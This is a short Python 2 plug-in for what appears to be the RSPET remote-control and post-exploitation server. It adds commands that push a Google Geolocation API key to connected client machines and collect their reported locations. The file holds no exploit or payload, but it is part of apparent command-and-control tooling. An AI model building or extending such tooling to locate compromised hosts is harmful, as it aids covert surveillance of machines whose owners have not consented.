"""
Plug-in module for RSPET server. Offer Client Geolocation functionalities.
"""
from __future__ import print_function
from socket import error as sock_error
from urllib2 import urlopen, HTTPError
import time
from Plugins.mount import Plugin, command

class Geolocation(Plugin):
    """
    Providing a best effort client Geolocation service.
    """

    @command("basic", "connected", "multiple")
    def geolocation_config(self, server, args):
        """ Provide Google API key for the Geolocation service.

        Help: <API-Key>"""
        ret = [None, 0, ""]
        if len(args) < 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["geolocation_config"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            server.config["geo-api"] = args[0]
        return ret

    @command("connected", "multiple")
    def geo_init(self, server, host, args):
        """Initialize the Geolocation plugin on the selected client(s).

        Help: """
        ret = [None, 0, ""]
        try:
            en_data = host.recv(3)
        except sock_error:
            raise sock_error
        if en_data == 'psi':
            host.info["commands"].append("get_location")
        else:
            ret[2] = "Error Initializing the plugin on the client."
        return ret

    @command("connected", "multiple")
    def get_location(self, server, host, args):
        """ Request Geolocation information from selected host(s).

        Help: """
        ret = [None, 0, ""]
        try:
            key = server.config["geo-api"]
        except KeyError:
            ret[2] = "Plugin configuration missing. See Plugin documentation."
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            host.send("%02d" % len(key))
            host.send(key)
            time.sleep(2)
            en_data = host.recv(13) # Reply json up to 9999999999999 chars
            reply = host.recv(int(en_data))
            ret[2] = reply
        return ret
